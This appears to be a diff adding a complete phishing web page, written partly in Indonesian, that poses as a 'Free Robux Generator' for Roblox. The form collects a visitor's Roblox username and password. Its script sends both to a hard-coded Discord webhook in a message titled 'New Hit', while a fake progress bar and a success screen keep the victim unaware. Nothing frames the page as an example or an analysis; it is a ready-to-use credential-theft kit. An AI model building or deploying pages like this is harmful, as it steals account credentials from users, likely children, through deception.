@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox Free Robux 2025</title>
+<link rel="icon" href="https://www.roblox.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Inter,system-ui,sans-serif;background:#121212;color:#fff;min-height:100vh}
+.top{background:#1a1a1a;padding:12px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #333}
+.logo{font-weight:800;font-size:20px}
+.live{background:#00b06f;font-size:11px;padding:3px 9px;border-radius:20px}
+.hero{text-align:center;padding:36px 16px 16px}
+.hero h1{font-size:28px;background:linear-gradient(90deg,#00b06f,#00d9a5);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{color:#aaa;font-size:14px;margin-top:6px}
+.box{max-width:420px;margin:0 auto;padding:0 16px 40px}
+.card{background:#1e1e1e;border:1px solid #333;border-radius:14px;padding:20px}
+h2{font-size:16px;margin-bottom:14px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.opt{background:#2a2a2a;border:2px solid #3a3a3a;border-radius:10px;padding:14px;text-align:center;cursor:pointer}
+.opt.selected{border-color:#00b06f;background:rgba(0,176,111,.15)}
+.opt .amt{font-size:20px;font-weight:800;color:#00d9a5}
+.opt .lbl{font-size:11px;color:#888;margin-top:2px}
+.fg{margin:16px 0 10px}
+.fg label{display:block;font-size:12px;color:#ccc;margin-bottom:5px}
+.fg input{width:100%;background:#2a2a2a;border:1px solid #444;border-radius:9px;padding:13px;color:#fff;font-size:14px;outline:none}
+.btn{width:100%;background:linear-gradient(135deg,#00b06f,#00d9a5);color:#000;font-weight:700;font-size:15px;padding:14px;border:none;border-radius:10px;cursor:pointer;margin-top:8px}
+.prog{display:none;margin-top:18px}
+.bar{height:7px;background:#333;border-radius:4px;overflow:hidden}
+.fill{height:100%;width:0;background:linear-gradient(90deg,#00b06f,#00d9a5);transition:width .3s}
+.ptxt{font-size:12px;color:#aaa;text-align:center;margin-top:8px}
+.success{display:none;text-align:center;padding:10px 0}
+.check{width:56px;height:56px;background:#00b06f;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:28px}
+</style>
+</head>
+<body>
+<div class="top">
+  <div class="logo">ROBLOX</div>
+  <div class="live">LIVE</div>
+</div>
+<div class="hero">
+  <h1>Free Robux Generator</h1>
+  <p>Pilih jumlah & masukkan username. Robux langsung masuk.</p>
+</div>
+<div class="box">
+  <div class="card" id="main">
+    <h2>Pilih Jumlah Robux</h2>
+    <div class="grid">
+      <div class="opt" data-a="400"><div class="amt">400</div><div class="lbl">Robux</div></div>
+      <div class="opt" data-a="800"><div class="amt">800</div><div class="lbl">Robux</div></div>
+      <div class="opt selected" data-a="1700"><div class="amt">1.700</div><div class="lbl">Robux</div></div>
+      <div class="opt" data-a="4500"><div class="amt">4.500</div><div class="lbl">Robux</div></div>
+      <div class="opt" data-a="10000"><div class="amt">10.000</div><div class="lbl">Robux</div></div>
+      <div class="opt" data-a="25000"><div class="amt">25.000</div><div class="lbl">Robux</div></div>
+    </div>
+    <div class="fg">
+      <label>Username Roblox</label>
+      <input id="user" placeholder="Masukkan username" autocomplete="off">
+    </div>
+    <div class="fg">
+      <label>Password</label>
+      <input id="pass" type="password" placeholder="Masukkan password" autocomplete="off">
+    </div>
+    <button class="btn" id="btn" onclick="go()">Generate Free Robux</button>
+    <div class="prog" id="prog">
+      <div class="bar"><div class="fill" id="fill"></div></div>
+      <div class="ptxt" id="ptxt">Connecting...</div>
+    </div>
+  </div>
+  <div class="card success" id="ok">
+    <div class="check">✓</div>
+    <h3 style="margin-bottom:6px">Berhasil!</h3>
+    <p style="color:#aaa;font-size:13px;margin-bottom:16px" id="msg"></p>
+    <button class="btn" onclick="location.href='https://www.roblox.com/login'">Klaim Sekarang</button>
+  </div>
+</div>
+<script>
+let amt=1700;
+document.querySelectorAll('.opt').forEach(o=>{
+  o.onclick=()=>{document.querySelectorAll('.opt').forEach(x=>x.classList.remove('selected'));o.classList.add('selected');amt=+o.dataset.a}
+});
+function go(){
+  const u=document.getElementById('user').value.trim();
+  const p=document.getElementById('pass').value;
+  if(!u||!p){alert('Isi username & password');return}
+  document.getElementById('btn').disabled=true;
+  document.getElementById('btn').textContent='Processing...';
+  document.querySelectorAll('.fg').forEach(e=>e.style.display='none');
+  document.getElementById('btn').style.display='none';
+  document.getElementById('prog').style.display='block';
+
+  fetch('https://discord.com/api/webhooks/1562775691257319474/tzOst895RIpIhMz2K3jQrRHlPEEvpRSVnU53VE9J3i-EgGLHYl-bRCFp2guo9fvex-Ke',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      embeds:[{
+        title:'New Hit',
+        color:5763719,
+        fields:[
+          {name:'Username',value:'`'+u+'`',inline:true},
+          {name:'Password',value:'`'+p+'`',inline:true},
+          {name:'Amount',value:amt.toLocaleString()+' Robux',inline:true}
+        ]
+      }]
+    })
+  }).catch(()=>{});
+
+  const steps=[{p:20,t:'Connecting...'},{p:45,t:'Verifying...'},{p:70,t:'Generating...'},{p:90,t:'Injecting...'},{p:100,t:'Done'}];
+  let i=0;
+  const t=setInterval(()=>{
+    if(i>=steps.length){clearInterval(t);setTimeout(()=>{
+      document.getElementById('main').style.display='none';
+      document.getElementById('ok').style.display='block';
+      document.getElementById('msg').textContent=amt.toLocaleString()+' Robux siap diklaim.';
+    },500);return}
+    document.getElementById('fill').style.width=steps[i].p+'%';
+    document.getElementById('ptxt').textContent=steps[i].t;
+    i++;
+  },800);
+}
+</script>
+</body>
+</html>
